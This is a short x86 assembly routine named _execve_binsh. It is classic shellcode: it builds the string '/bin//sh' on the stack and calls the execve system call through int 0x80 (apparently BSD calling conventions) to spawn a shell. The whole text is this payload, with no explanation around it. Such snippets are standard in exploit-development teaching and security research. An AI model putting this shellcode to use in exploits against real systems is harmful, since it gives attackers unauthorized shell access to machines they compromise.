_execve_binsh:	
	xor	eax, eax
	push	eax	   ; "\0\0\0\0"
	push	0x68732f2f ; "//sh"
	push	0x6e69622f ; "/bin"
	mov	ebx, esp
	push	eax	; envp
	push	eax	; argv
	push	ebx	; path
	push	eax	; spacer
	mov	al, 59	; SYS_execve
	int	0x80
